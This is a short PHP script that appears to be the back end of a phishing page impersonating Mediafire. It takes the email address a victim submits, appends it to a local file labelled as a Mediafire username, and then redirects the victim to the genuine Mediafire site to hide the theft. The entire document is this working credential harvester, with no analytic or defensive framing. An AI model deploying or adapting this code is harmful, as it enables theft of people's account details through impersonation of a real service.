<?php
file_put_contents("usernames.txt", "Mediafire Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://www.mediafire.com');
?>
